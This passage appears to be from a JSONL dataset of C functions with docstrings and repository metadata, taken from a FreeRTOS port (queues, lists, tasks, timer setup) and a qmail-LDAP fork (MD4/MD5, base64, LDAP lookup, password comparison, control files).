pdFAIL;\n\t\t\ttraceQUEUE_RECEIVE_FROM_ISR_FAILED( pxQueue );\n\t\t}\n\t}\n\tportCLEAR_INTERRUPT_MASK_FROM_ISR( uxSavedInterruptStatus );\n\n\treturn xReturn;\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static void prvCheckTasksWaitingTermination( void )", "code": "{\n\t#if ( INCLUDE_vTaskDelete == 1 )\n\t{\n\t\tportBASE_TYPE xListIsEmpty;\n\n\t\t/* ucTasksDeleted is used to prevent vTaskSuspendAll() being called\n\t\ttoo often in the idle task. */\n\t\tif( uxTasksDeleted > ( unsigned portBASE_TYPE ) 0U )\n\t\t{\n\t\t\tvTaskSuspendAll();\n\t\t\t\txListIsEmpty = listLIST_IS_EMPTY( &xTasksWaitingTermination );\n\t\t\txTaskResumeAll();\n\n\t\t\tif( xListIsEmpty == pdFALSE )\n\t\t\t{\n\t\t\t\ttskTCB *pxTCB;\n\n\t\t\t\ttaskENTER_CRITICAL();\n\t\t\t\t{\n\t\t\t\t\tpxTCB = ( tskTCB * ) listGET_OWNER_OF_HEAD_ENTRY( ( ( xList * ) &xTasksWaitingTermination ) );\n\t\t\t\t\tvListRemove( &( pxTCB->xGenericListItem ) );\n\t\t\t\t\t--uxCurrentNumberOfTasks;\n\t\t\t\t\t--uxTasksDeleted;\n\t\t\t\t}\n\t\t\t\ttaskEXIT_CRITICAL();\n\n\t\t\t\tprvDeleteTCB( pxTCB );\n\t\t\t}\n\t\t}\n\t}\n\t#endif\n}", "path": "tasks.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vQueueDelete( xQueueHandle pxQueue )", "code": "{\n\tconfigASSERT( pxQueue );\n\n\ttraceQUEUE_DELETE( pxQueue );\n\tvQueueUnregisterQueue( pxQueue );\n\tvPortFree( pxQueue->pcHead );\n\tvPortFree( pxQueue );\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vListRemove( xListItem *pxItemToRemove )", "code": "{\nxList * pxList;\n\n\tpxItemToRemove->pxNext->pxPrevious = pxItemToRemove->pxPrevious;\n\tpxItemToRemove->pxPrevious->pxNext = pxItemToRemove->pxNext;\n\t\n\t/* The list item knows which list it is in.  Obtain the list from the list\n\titem. */\n\tpxList = ( xList * ) pxItemToRemove->pvContainer;\n\n\t/* Make sure the index is left pointing to a valid item. */\n\tif( pxList->pxIndex == pxItemToRemove )\n\t{\n\t\tpxList->pxIndex = pxItemToRemove->pxPrevious;\n\t}\n\n\tpxItemToRemove->pvContainer = NULL;\n\t( pxList->uxNumberOfItems )--;\n}", "path": "list.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vListInsertEnd( xList *pxList, xListItem *pxNewListItem )", "code": "{\nvolatile xListItem * pxIndex;\n\n\t/* Insert a new list item into pxList, but rather than sort the list,\n\tmakes the new list item the last item to be removed by a call to\n\tpvListGetOwnerOfNextEntry.  This means it has to be the item pointed to by\n\tthe pxIndex member. */\n\tpxIndex = pxList->pxIndex;\n\n\tpxNewListItem->pxNext = pxIndex->pxNext;\n\tpxNewListItem->pxPrevious = pxList->pxIndex;\n\tpxIndex->pxNext->pxPrevious = ( volatile xListItem * ) pxNewListItem;\n\tpxIndex->pxNext = ( volatile xListItem * ) pxNewListItem;\n\tpxList->pxIndex = ( volatile xListItem * ) pxNewListItem;\n\n\t/* Remember which list the item is in. */\n\tpxNewListItem->pvContainer = ( void * ) pxList;\n\n\t( pxList->uxNumberOfItems )++;\n}", "path": "list.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "portTickType xTaskGetTickCountFromISR( void )", "code": "{\nportTickType xReturn;\nunsigned portBASE_TYPE uxSavedInterruptStatus;\n\n\tuxSavedInterruptStatus = portSET_INTERRUPT_MASK_FROM_ISR();\n\txReturn = xTickCount;\n\tportCLEAR_INTERRUPT_MASK_FROM_ISR( uxSavedInterruptStatus );\n\n\treturn xReturn;\n}", "path": "tasks.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------\n * PUBLIC TASK UTILITIES documented in task.h\n *----------------------------------------------------------*/\n", "func_signal": "portTickType xTaskGetTickCount( void )", "code": "{\nportTickType xTicks;\n\n\t/* Critical section required if running on a 16 bit processor. */\n\ttaskENTER_CRITICAL();\n\t{\n\t\txTicks = xTickCount;\n\t}\n\ttaskEXIT_CRITICAL();\n\n\treturn xTicks;\n}", "path": "tasks.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*\n * Setup timer 1 compare match A to generate a tick interrupt.\n */\n", "func_signal": "static void prvSetupTimerInterrupt( void )", "code": "{\nunsigned long ulCompareMatch;\nunsigned char ucHighByte, ucLowByte;\n\n\t/* Using 16bit timer 1 to generate the tick.  Correct fuses must be\n\tselected for the configCPU_CLOCK_HZ clock. */\n\n\tulCompareMatch = configCPU_CLOCK_HZ / configTICK_RATE_HZ;\n\n\t/* We only have 16 bits so have to scale to get our required tick rate. */\n\tulCompareMatch /= portCLOCK_PRESCALER;\n\n\t/* Adjust for correct value. */\n\tulCompareMatch -= ( unsigned long ) 1;\n\n\t/* Setup compare match value for compare match A.  Interrupts are disabled \n\tbefore this is called so we need not worry here. */\n\tucLowByte = ( unsigned char ) ( ulCompareMatch & ( unsigned long ) 0xff );\n\tulCompareMatch >>= 8;\n\tucHighByte = ( unsigned char ) ( ulCompareMatch & ( unsigned long ) 0xff );\n\tOCR1AH = ucHighByte;\n\tOCR1AL = ucLowByte;\n\n\t/* Setup clock source and compare match behaviour. */\n\tucLowByte = portCLEAR_COUNTER_ON_MATCH | portPRESCALE_64;\n\tTCCR1B = ucLowByte;\n\n\t/* Enable the interrupt - this is okay as interrupt are currently globally\n\tdisabled. */\n\tucLowByte = TIMSK1;\n\tucLowByte |= portCOMPARE_MATCH_A_INTERRUPT_ENABLE;\n\tTIMSK1 = ucLowByte;\n}", "path": "port.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static signed portBASE_TYPE prvIsQueueEmpty( const xQueueHandle pxQueue )", "code": "{\nsigned portBASE_TYPE xReturn;\n\n\ttaskENTER_CRITICAL();\n\t\txReturn = ( pxQueue->uxMessagesWaiting == ( unsigned portBASE_TYPE ) 0 );\n\ttaskEXIT_CRITICAL();\n\n\treturn xReturn;\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "static void prvCopyDataFromQueue( xQUEUE * const pxQueue, const void *pvBuffer )", "code": "{\n\tif( pxQueue->uxQueueType != queueQUEUE_IS_MUTEX )\n\t{\n\t\tpxQueue->pcReadFrom += pxQueue->uxItemSize;\n\t\tif( pxQueue->pcReadFrom >= pxQueue->pcTail )\n\t\t{\n\t\t\tpxQueue->pcReadFrom = pxQueue->pcHead;\n\t\t}\n\t\tmemcpy( ( void * ) pvBuffer, ( void * ) pxQueue->pcReadFrom, ( unsigned ) pxQueue->uxItemSize );\n\t}\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "unsigned portBASE_TYPE uxQueueMessagesWaiting( const xQueueHandle pxQueue )", "code": "{\nunsigned portBASE_TYPE uxReturn;\n\n\tconfigASSERT( pxQueue );\n\n\ttaskENTER_CRITICAL();\n\t\tuxReturn = pxQueue->uxMessagesWaiting;\n\ttaskEXIT_CRITICAL();\n\n\treturn uxReturn;\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "signed portBASE_TYPE xQueueIsQueueEmptyFromISR( const xQueueHandle pxQueue )", "code": "{\nsigned portBASE_TYPE xReturn;\n\n\tconfigASSERT( pxQueue );\n\txReturn = ( pxQueue->uxMessagesWaiting == ( unsigned portBASE_TYPE ) 0 );\n\n\treturn xReturn;\n}", "path": "queue.c", "repo_name": "maniacbug/FreeRTOS", "stars": 50, "license": "None", "language": "c", "size": 216}
{"docstring": "/* MD4 basic transformation. Transforms state based on block.\n */\n", "func_signal": "static void\nMD4Transform(uint32 state[4], const unsigned char block[64])", "code": "{\n  uint32 a = state[0], b = state[1], c = state[2], d = state[3], x[16];\n\n  Decode (x, 64, block);\n\n  /* Round 1 */\n  FF (a, b, c, d, x[ 0], S11); /* 1 */\n  FF (d, a, b, c, x[ 1], S12); /* 2 */\n  FF (c, d, a, b, x[ 2], S13); /* 3 */\n  FF (b, c, d, a, x[ 3], S14); /* 4 */\n  FF (a, b, c, d, x[ 4], S11); /* 5 */\n  FF (d, a, b, c, x[ 5], S12); /* 6 */\n  FF (c, d, a, b, x[ 6], S13); /* 7 */\n  FF (b, c, d, a, x[ 7], S14); /* 8 */\n  FF (a, b, c, d, x[ 8], S11); /* 9 */\n  FF (d, a, b, c, x[ 9], S12); /* 10 */\n  FF (c, d, a, b, x[10], S13); /* 11 */\n  FF (b, c, d, a, x[11], S14); /* 12 */\n  FF (a, b, c, d, x[12], S11); /* 13 */\n  FF (d, a, b, c, x[13], S12); /* 14 */\n  FF (c, d, a, b, x[14], S13); /* 15 */\n  FF (b, c, d, a, x[15], S14); /* 16 */\n\n  /* Round 2 */\n  GG (a, b, c, d, x[ 0], S21); /* 17 */\n  GG (d, a, b, c, x[ 4], S22); /* 18 */\n  GG (c, d, a, b, x[ 8], S23); /* 19 */\n  GG (b, c, d, a, x[12], S24); /* 20 */\n  GG (a, b, c, d, x[ 1], S21); /* 21 */\n  GG (d, a, b, c, x[ 5], S22); /* 22 */\n  GG (c, d, a, b, x[ 9], S23); /* 23 */\n  GG (b, c, d, a, x[13], S24); /* 24 */\n  GG (a, b, c, d, x[ 2], S21); /* 25 */\n  GG (d, a, b, c, x[ 6], S22); /* 26 */\n  GG (c, d, a, b, x[10], S23); /* 27 */\n  GG (b, c, d, a, x[14], S24); /* 28 */\n  GG (a, b, c, d, x[ 3], S21); /* 29 */\n  GG (d, a, b, c, x[ 7], S22); /* 30 */\n  GG (c, d, a, b, x[11], S23); /* 31 */\n  GG (b, c, d, a, x[15], S24); /* 32 */\n\n  /* Round 3 */\n  HH (a, b, c, d, x[ 0], S31); /* 33 */\n  HH (d, a, b, c, x[ 8], S32); /* 34 */\n  HH (c, d, a, b, x[ 4], S33); /* 35 */\n  HH (b, c, d, a, x[12], S34); /* 36 */\n  HH (a, b, c, d, x[ 2], S31); /* 37 */\n  HH (d, a, b, c, x[10], S32); /* 38 */\n  HH (c, d, a, b, x[ 6], S33); /* 39 */\n  HH (b, c, d, a, x[14], S34); /* 40 */\n  HH (a, b, c, d, x[ 1], S31); /* 41 */\n  HH (d, a, b, c, x[ 9], S32); /* 42 */\n  HH (c, d, a, b, x[ 5], S33); /* 43 */\n  HH (b, c, d, a, x[13], S34); /* 44 */\n  HH (a, b, c, d, x[ 3], S31); /* 45 */\n  HH (d, a, b, c, x[11], S32); /* 46 */\n  HH (c, d, a, b, x[ 7], S33); /* 47 */\n  HH (b, c, d, a, x[15], S34); /* 48 */\n\n  state[0] += a;\n  state[1] += b;\n  state[2] += c;\n  state[3] += d;\n\n  /* Zeroize sensitive information.\n   */\n  byte_zero((POINTER) x, sizeof (x));\n}", "path": "digest_md4.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* MD4 finalization. Ends an MD4 message-digest operation, writing the\n     the message digest and zeroizing the context.\n */\n", "func_signal": "void\nMD4Final(unsigned char digest[MD4_LEN], MD4_CTX *context)", "code": "{\n  unsigned char bits[8];\n  unsigned int idx, padLen;\n  uint32 hi, lo;\n\n  /* Save number of bits */\n  hi = context->count[1];\n  lo = context->count[0];\n  Encode (bits, 4, &lo);\n  Encode (bits + 4, 4, &hi);\n\n  /* Pad out to 56 mod 64.\n   */\n  idx = (unsigned int)((context->count[0] >> 3) & 0x3f);\n  padLen = (idx < 56) ? (56 - idx) : (120 - idx);\n  MD4Update (context, PADDING, padLen);\n\n  /* Append length (before padding) */\n  MD4Update (context, bits, 8);\n\n  if (digest != (unsigned char *)0) {\n    /* Store state in digest */\n    Encode (digest, 16, context->state);\n\n    /* Zeroize sensitive information.\n     */\n\tbyte_zero((POINTER) context, sizeof (*context));\n  }\n}", "path": "digest_md4.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* Decodes input (unsigned char) into output (uint32). Assumes len is\n  a multiple of 4.\n */\n", "func_signal": "static void\nDecode(void *out, size_t len, const void *in)", "code": "{\n  uint32 *output = out;\n  const unsigned char *input = in;\n  size_t i, j;\n\n  for (i = 0, j = 0; j < len; i++, j += 4)\n    output[i] = ((uint32)input[j]) | (((uint32)input[j+1]) << 8) |\n    (((uint32)input[j+2]) << 16) | (((uint32)input[j+3]) << 24);\n}", "path": "digest_md5.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* XXX\n   this is not the complete subset of ctypes.h isspace but for qmail-ldap\n   only space, tab, newline and carriage-return are useful (formfeed and \n   vertical tabs are normaly not used in network communications.\n                                            Claudio Jeker\n */\n", "func_signal": "int\nb64_pton(char const *src, unsigned char *target, size_t targsize)", "code": "{\n\tsize_t tarindex;\n\tint state, ch;\n\tunsigned int pos;\n\n\tstate = 0;\n\ttarindex = 0;\n\n\twhile ((ch = *src++) != '\\0') {\n\t\tif (ISSPACE(ch))\t/* Skip whitespace anywhere. */\n\t\t\tcontinue;\n\n\t\tif (ch == Pad64)\n\t\t\tbreak;\n\n\t\tpos = str_chr(Base64, ch);\n\t\tif (pos > 63) \t\t/* A non-base64 character. */\n\t\t\treturn (-1);\n\n\t\tswitch (state) {\n\t\tcase 0:\n\t\t\tif (target) {\n\t\t\t\tif (tarindex >= targsize)\n\t\t\t\t\treturn (-1);\n\t\t\t\ttarget[tarindex] = pos << 2;\n\t\t\t}\n\t\t\tstate = 1;\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\tif (target) {\n\t\t\t\tif (tarindex + 1 >= targsize)\n\t\t\t\t\treturn (-1);\n\t\t\t\ttarget[tarindex]   |=  pos >> 4;\n\t\t\t\ttarget[tarindex+1]  = (pos & 0x0f) << 4 ;\n\t\t\t}\n\t\t\ttarindex++;\n\t\t\tstate = 2;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tif (target) {\n\t\t\t\tif (tarindex + 1 >= targsize)\n\t\t\t\t\treturn (-1);\n\t\t\t\ttarget[tarindex]   |=  pos >> 2;\n\t\t\t\ttarget[tarindex+1]  = (pos & 0x03) << 6;\n\t\t\t}\n\t\t\ttarindex++;\n\t\t\tstate = 3;\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tif (target) {\n\t\t\t\tif (tarindex >= targsize)\n\t\t\t\t\treturn (-1);\n\t\t\t\ttarget[tarindex] |= pos;\n\t\t\t}\n\t\t\ttarindex++;\n\t\t\tstate = 0;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tstrerr_die1x(111, \"Abort: bad state in base64 decode.\");\n\t\t}\n\t}\n\n\t/*\n\t * We are done decoding Base-64 chars.  Let's see if we ended\n\t * on a byte boundary, and/or with erroneous trailing characters.\n\t */\n\n\tif (ch == Pad64) {\t\t/* We got a pad char. */\n\t\tch = *src++;\t\t/* Skip it, get next. */\n\t\tswitch (state) {\n\t\tcase 0:\t\t/* Invalid = in first position */\n\t\tcase 1:\t\t/* Invalid = in second position */\n\t\t\treturn (-1);\n\n\t\tcase 2:\t\t/* Valid, means one byte of info */\n\t\t\t/* Skip any number of spaces. */\n\t\t\tfor (; ch != '\\0'; ch = *src++)\n\t\t\t\tif (!ISSPACE(ch))\n\t\t\t\t\tbreak;\n\t\t\t/* Make sure there is another trailing = sign. */\n\t\t\tif (ch != Pad64)\n\t\t\t\treturn (-1);\n\t\t\tch = *src++;\t\t/* Skip the = */\n\t\t\t/* Fall through to \"single trailing =\" case. */\n\t\t\t/* FALLTHROUGH */\n\n\t\tcase 3:\t\t/* Valid, means two bytes of info */\n\t\t\t/*\n\t\t\t * We know this char is an =.  Is there anything but\n\t\t\t * whitespace after it?\n\t\t\t */\n\t\t\tfor (; ch != '\\0'; ch = *src++)\n\t\t\t\tif (!ISSPACE(ch))\n\t\t\t\t\treturn (-1);\n\n\t\t\t/*\n\t\t\t * Now make sure for cases 2 and 3 that the \"extra\"\n\t\t\t * bits that slopped past the last full byte were\n\t\t\t * zeros.  If we don't check them, they become a\n\t\t\t * subliminal channel.\n\t\t\t */\n\t\t\tif (target && target[tarindex] != 0)\n\t\t\t\treturn (-1);\n\t\t}\n\t} else {\n\t\t/*\n\t\t * We ended by seeing the end of the string.  Make sure we\n\t\t * have no partial bytes lying around.\n\t\t */\n\t\tif (state != 0)\n\t\t\treturn (-1);\n\t}\n\n\treturn (tarindex);\n}", "path": "base64.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* MD4 initialization. Begins an MD4 operation, writing a new context.\n */\n", "func_signal": "void\nMD4Init(MD4_CTX *context)", "code": "{\n  context->count[0] = 0;\n  context->count[1] = 0;\n\n  /* Load magic initialization constants.\n   */\n  context->state[0] = 0x67452301;\n  context->state[1] = 0xefcdab89;\n  context->state[2] = 0x98badcfe;\n  context->state[3] = 0x10325476;\n}", "path": "digest_md4.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/******  LDAP OPEN, BIND & CLOSE  *********************************************/\n", "func_signal": "int\nqldap_open(qldap *q)", "code": "{\n\tint rc;\n\n\tCHECK(q, OPEN);\n\t\n\t/* allocate the connection */\n\tif ((q->ld = ldap_init(ldap_server.s,LDAP_PORT)) == 0) {\n\t\tlogit(128, \"qldap_open: init failed\\n\");\n\t\treturn ERRNO;\n\t}\n\tlogit(128, \"qldap_open: init successful\\n\");\n\n\trc = qldap_set_option(q, 0);\n\tif (rc != OK)\n\t\tlogit(128, \"qldap_open: qldap_set_option failed\\n\");\n\tq->state = rc==OK?OPEN:ERROR;\n\treturn rc;\n}", "path": "qldap.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* MD5 initialization. Begins an MD5 operation, writing a new context.\n */\n", "func_signal": "void\nMD5Init(MD5_CTX *context)", "code": "{\n  context->count[0] = 0;\n  context->count[1] = 0;\n\n  /* Load magic initialization constants. */\n  context->state[0] = 0x67452301;\n  context->state[1] = 0xefcdab89;\n  context->state[2] = 0x98badcfe;\n  context->state[3] = 0x10325476;\n}", "path": "digest_md5.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* defined if flagcont */\n", "func_signal": "void stamp_make()", "code": "{\n  struct timeval tv;\n  char *s;\n  gettimeofday(&tv,(struct timezone *) 0);\n  s = stamp;\n  s += fmt_ulong(s,(unsigned long) tv.tv_sec);\n  *s++ = '.';\n  s += fmt_uint0(s,(unsigned int) tv.tv_usec,6);\n  *s = 0;\n}", "path": "splogger.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* static const char HexBig[] = \"0123456789ABCDEF\"; */\n", "func_signal": "int\nhex_ntops(unsigned char const *src, size_t srclength, stralloc *dest)", "code": "{\n\tsize_t\ti;\n\t\n\tif (!stralloc_copys(dest, \"\")) return -1;\n\tfor (i=0; i<srclength; i++) {\n\t\tif (!stralloc_append(dest, &Hex[src[i] >> 4])) return -1;\n\t\tif (!stralloc_append(dest, &Hex[src[i] & 0x0f])) return -1;\n\t}\n\treturn 0;\n}", "path": "base64.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/******  LDAP SEARCH & FILTER  ************************************************/\n", "func_signal": "int\nqldap_lookup(qldap *q, const char *filter, const char *attrs[])", "code": "{\n\t/* search a unique entry */\n\tstruct timeval\ttv;\n\tint\t\trc;\n\tunsigned int\tnum_entries;\n\t\n\tCHECK(q, SEARCH);\n\t\n\ttv.tv_sec = ldap_timeout;\n\ttv.tv_usec = 0;\n\n\trc = ldap_search_st(q->ld, basedn.s, LDAP_SCOPE_SUBTREE,\n\t\tfilter, (char **)attrs, 0, &tv, &q->res);\n\t\n\tswitch (rc) {\n\t/* probably more detailed information should be returned, eg.:\n\t   LDAP_TIMELIMIT_EXCEEDED,\n\t   LDAP_SIZELIMIT_EXCEEDED,\n\t   LDAP_PARTIAL_RESULTS,\n\t   LDAP_INSUFFICIENT_ACCESS,\n\t   LDAP_BUSY,\n\t   LDAP_UNAVAILABLE,\n\t   LDAP_UNWILLING_TO_PERFORM,\n\t   LDAP_TIMEOUT\n\t */\n\n\tcase LDAP_SUCCESS:\n\t\tlogit(128, \"qldap_lookup: search for %s succeeded\\n\",\n\t\t    filter);\n\t\tbreak;\n\tcase LDAP_TIMEOUT:\n\tcase LDAP_TIMELIMIT_EXCEEDED:\n\tcase LDAP_BUSY:\n\t\tlogit(64, \"qldap_lookup: search for %s failed (%s)\\n\", \n\t\t    filter, ldap_err2string(rc) );\n\t\treturn TIMEOUT;\n\tcase LDAP_NO_SUCH_OBJECT:\n\t\tlogit(64, \"qldap_filter: search for %s failed (%s)\\n\", \n\t\t    filter, ldap_err2string(rc) );\n\t\treturn NOSUCH;\n\tdefault:\n\t\tlogit(64, \"qldap_lookup: search for %s failed (%s)\\n\", \n\t\t    filter, ldap_err2string(rc) );\n\t\treturn FAILED;\n\t}\n\n\t/* count the results, we must have exactly one */\n\tnum_entries = ldap_count_entries(q->ld, q->res);\n\tif (num_entries != 1) {\n\t\tif (num_entries > 1) {\n\t\t\tlogit(64, \"qldap_lookup: Too many entries found (%i)\\n\", \n\t\t\t    num_entries);\n\t\t\treturn TOOMANY;\n\t\t} else {\n\t\t\tlogit(64, \"qldap_lookup: Nothing found\\n\"); \n\t\t\treturn NOSUCH;\n\t\t}\n\t}\n\t/* go to the first entry */\n\tq->msg = ldap_first_entry(q->ld, q->res);\n\t\n\t/*\n\t * We already selected the first and only entry so\n\t * skip SEARCH state and move directly to EXTRACT state.\n\t */\n\tq->state = EXTRACT;\n\treturn OK;\n}", "path": "qldap.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* use logstart, logadd and logend with care, if there is no corresponding\n   start or end starnge messages will be loged or some important messages \n   will be lost */\n", "func_signal": "void\nlogstart(unsigned long level, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tchar ch;\n\n\tva_start(ap, fmt);\n\tif ( ! ( loglevel & level ) ) return;\n\tch = 15;\n\tif ( addLOG ) if ( substdio_put(&sslog, &ch, 1) ) return;\n\tva_output(&sslog, fmt, ap);\n\tva_end(ap);\n}", "path": "qldap-debug.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* this file is too long ---------------------------------------------- MAIN */\n", "func_signal": "int getcontrols()", "code": "{\n struct stat st;\n\n if (control_init() == -1) return 0;\n if (control_readint(&lifetime,\"control/queuelifetime\") == -1) return 0;\n if (control_readint(&concurrency[0],\"control/concurrencylocal\") == -1) return 0;\n if (control_readint(&concurrency[1],\"control/concurrencyremote\") == -1) return 0;\n if (control_rldef(&envnoathost,\"control/envnoathost\",1,\"envnoathost\") != 1) return 0;\n if (control_rldef(&bouncefrom,\"control/bouncefrom\",0,\"MAILER-DAEMON\") != 1) return 0;\n if (control_rldef(&bouncehost,\"control/bouncehost\",1,\"bouncehost\") != 1) return 0;\n if (control_rldef(&doublebouncehost,\"control/doublebouncehost\",1,\"doublebouncehost\") != 1) return 0;\n if (control_rldef(&doublebounceto,\"control/doublebounceto\",0,\"postmaster\") != 1) return 0;\n if (!stralloc_cats(&doublebounceto,\"@\")) return 0;\n if (!stralloc_cat(&doublebounceto,&doublebouncehost)) return 0;\n if (!stralloc_0(&doublebounceto)) return 0;\n if (control_readint(&bouncemaxbytes,\"control/bouncemaxbytes\") == -1) return 0;\n if (control_readrawfile(&custombouncetext,\"control/custombouncetext\") == -1) return 0;\n if (!stralloc_0(&custombouncetext) ) return 0;\n\n if (stat(\"control/locals.cdb\", &st) == 0) {\n   if (!stralloc_copys(&localscdb, auto_qmail)) return 0;\n   if (!stralloc_cats(&localscdb, \"/control/locals.cdb\")) return 0;\n   if (!stralloc_0(&localscdb)) return 0;\n   if (!constmap_init(&maplocals,\"\",0,1)) return 0;\n } else {\n   if (control_readfile(&locals,\"control/locals\",1) != 1) return 0;\n   if (!constmap_init(&maplocals,locals.s,locals.len,0)) return 0;\n }\n\n switch(control_readfile(&percenthack,\"control/percenthack\",0))\n  {\n   case -1: return 0;\n   case 0: if (!constmap_init(&mappercenthack,\"\",0,0)) return 0; break;\n   case 1: if (!constmap_init(&mappercenthack,percenthack.s,percenthack.len,0)) return 0; break;\n  }\n switch(control_readfile(&vdoms,\"control/virtualdomains\",0))\n  {\n   case -1: return 0;\n   case 0: if (!constmap_init(&mapvdoms,\"\",0,1)) return 0; break;\n   case 1: if (!constmap_init(&mapvdoms,vdoms.s,vdoms.len,1)) return 0; break;\n  }\n return 1; }\n\nstralloc newlocals = {0};\nstralloc newvdoms = {0};\nstralloc newcbtext = {0};\n\nvoid regetcontrols()\n{\n struct stat st;\n int r;\n\n if (control_readint(&bouncemaxbytes,\"control/bouncemaxbytes\") == -1)\n  { log1(\"alert: unable to reread control/bouncemaxbytes\\n\"); return; }\n \n if (control_readrawfile(&newcbtext,\"control/custombouncetext\") == -1)\n  { log1(\"alert: unable to reread control/custombouncetext\\n\"); return; }\n while (!stralloc_0(&newcbtext)) nomem();\n while (!stralloc_copy(&custombouncetext,&newcbtext)) nomem();\n\n if (stat(\"control/locals.cdb\", &st) == 0) {\n   while (!stralloc_copys(&localscdb, auto_qmail)) nomem();\n   while (!stralloc_cats(&localscdb, \"/control/locals.cdb\")) nomem();\n   while  (!stralloc_0(&localscdb)) nomem();\n   \n   constmap_free(&maplocals);\n   while (!constmap_init(&maplocals,\"\",0,1)) nomem();\n } else {\n   if (control_readfile(&newlocals,\"control/locals\",1) != 1)\n    { log1(\"alert: unable to reread control/locals\\n\"); return; }\n   \n   while (!stralloc_copys(&localscdb, \"\")) nomem();\n   \n   constmap_free(&maplocals);\n   while (!stralloc_copy(&locals,&newlocals)) nomem();\n   while (!constmap_init(&maplocals,locals.s,locals.len,0)) nomem();\n }\n \n r = control_readfile(&newvdoms,\"control/virtualdomains\",0);\n if (r == -1)\n  { log1(\"alert: unable to reread control/virtualdomains\\n\"); return; }\n\n constmap_free(&mapvdoms);\n\n if (r)\n  {\n   while (!stralloc_copy(&vdoms,&newvdoms)) nomem();\n   while (!constmap_init(&mapvdoms,vdoms.s,vdoms.len,1)) nomem();\n  }\n else\n   while (!constmap_init(&mapvdoms,\"\",0,1)) nomem();\n}", "path": "qmail-send.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
{"docstring": "/* return zero on success else the error number */\n", "func_signal": "int\ncmp_passwd(char *clear, char *encrypted)", "code": "{\n\tint\ti, r;\n\n\tfor (i = 0; algo[i].scheme != 0; i++) {\n\t\tif (case_diffb(encrypted, algo[i].slen, algo[i].scheme) == 0) {\n\t\t\tencrypted += algo[i].slen;\n\t\t\tr = algo[i].func(clear, encrypted);\n\t\t\tif (r != OK) return r;\n\t\t\tlogit(256, \"cpm_passwd: comparing hashed %s\"\n\t\t\t    \"passwd (%S == %s)\\n\", \n\t\t\t    algo[i].scheme, hashed, encrypted);\n\t\t\tif (str_diffn(hashed.s, encrypted, hashed.len) == 0 &&\n\t\t\t    encrypted[hashed.len] == 0)\n\t\t\t\treturn OK;\n\t\t\t/* hashed passwds are equal */\n\t\t\treturn BADPASS;\n\t\t}\n\t}\n\tlogit(256, \"cpm_passwd: comparing crypt(3) passwd (%s == %s)\\n\", \n\t    crypt(clear,encrypted), encrypted);\n\tif (str_diff(encrypted, crypt(clear,encrypted)) == 0)\n\t\treturn OK;\n#ifdef CLEARTEXTPASSWD\n#warning ___CLEARTEXT_PASSWORD_SUPPORT_IS_ON___\n\t/* CLEARTEXTPASSWD ARE NOT GOOD */\n\t/* so they are disabled by default */\n\tif (str_diff(encrypted, clear) == 0)\n\t\treturn OK;\n#endif\n\treturn BADPASS;\n}", "path": "passwd.c", "repo_name": "amery/qmail", "stars": 41, "license": "other", "language": "c", "size": 721}
